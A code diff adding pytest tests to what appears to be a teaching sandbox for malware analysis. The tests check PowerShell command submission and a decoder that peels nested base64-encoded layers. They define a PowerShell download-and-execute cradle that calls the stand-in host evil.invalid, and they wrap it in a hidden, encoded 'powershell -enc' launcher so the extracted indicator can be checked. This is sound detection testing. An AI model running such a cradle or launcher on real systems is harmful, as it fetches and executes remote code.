@@ -267,3 +267,96 @@ def test_detonation_job_is_queued_with_its_own_timeout(client, student, monkeypa
     # The job is dominated by the one blocking call to the coordinator, so it
     # has to outlive that call's own timeout.
     assert seen["job_timeout"] > get_settings().sandbox_coordinator_timeout_seconds
+
+
+# -- command-line submissions --------------------------------------------------
+
+
+def _b64_utf16(text: str) -> str:
+    import base64
+
+    return base64.b64encode(text.encode("utf-16-le")).decode()
+
+
+CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://evil.invalid/a.ps1')"
+
+
+def _submit_command(client, headers, command: str):
+    return client.post(
+        "/api/v1/sandbox/commands",
+        json={"command": command, "shell": "powershell"},
+        headers=headers,
+    )
+
+
+def test_status_advertises_the_command_surface(client, student):
+    status = client.get("/api/v1/sandbox/status", headers=student).json()
+    assert status["shells"] == ["powershell"]
+    assert status["max_command_chars"] > 0
+
+
+def test_command_submission_produces_a_report(client, student):
+    resp = _submit_command(client, student, "Get-Process | Select-Object Name")
+    assert resp.status_code == 201, resp.text
+    report = resp.json()
+    assert report["state"] == "completed"
+    assert report["filename"] == "command.ps1"
+    assert report["media_type"] == "text/x-powershell"
+    assert report["submitter_handle"] == "stud1"
+
+
+def test_empty_command_is_rejected(client, student):
+    assert _submit_command(client, student, "   ").status_code == 422
+
+
+def test_oversized_command_is_rejected(client, student):
+    from palestrix.config import get_settings
+
+    too_long = "A" * (get_settings().sandbox_max_command_chars + 1)
+    # Pydantic bounds it at the schema edge; either refusal is correct.
+    assert _submit_command(client, student, too_long).status_code in (413, 422)
+
+
+def test_identical_commands_dedup_to_one_sample(client, student):
+    first = _submit_command(client, student, "Write-Host dedupe-me").json()
+    second = _submit_command(client, student, "Write-Host dedupe-me").json()
+    assert first["sample_sha256"] == second["sample_sha256"]
+    assert first["id"] != second["id"]          # still its own run
+    assert second["resubmission"] is True
+
+
+def test_obfuscated_command_is_peeled_and_its_ioc_surfaces(client, student):
+    """The C2 is not in the submitted text; only peeling reveals it."""
+    submitted = f"powershell -nop -w hidden -enc {_b64_utf16(CRADLE)}"
+    assert "evil.invalid" not in submitted
+
+    report = _submit_command(client, student, submitted).json()
+    assert report["state"] == "completed"
+    assert "http://evil.invalid/a.ps1" in report["iocs"]["urls"]
+    assert report["static"]["layers"], "decoded layers should be reported"
+    assert any(CRADLE in layer for layer in report["static"]["layers"])
+
+
+def test_peeler_handles_plain_and_nested_input():
+    from palestrix.sandbox.analysis import peel_encoded_layers
+
+    assert peel_encoded_layers("Get-Process") == []
+
+    one = peel_encoded_layers(f"powershell -enc {_b64_utf16(CRADLE)}")
+    assert len(one) == 1 and CRADLE in one[0]
+
+    nested = _b64_utf16(f"powershell -enc {_b64_utf16(CRADLE)}")
+    two = peel_encoded_layers(f"powershell -enc {nested}")
+    assert len(two) == 2 and CRADLE in two[-1]
+
+
+def test_peeler_ignores_base64_that_is_not_text():
+    from palestrix.sandbox.analysis import peel_encoded_layers
+    import base64
+
+    blob = base64.b64encode(bytes(range(256)) * 4).decode()
+    assert peel_encoded_layers(f"$x = '{blob}'") == []
+
+
+def test_commands_require_the_submit_capability(client):
+    assert _submit_command(client, {}, "Get-Process").status_code in (401, 403)
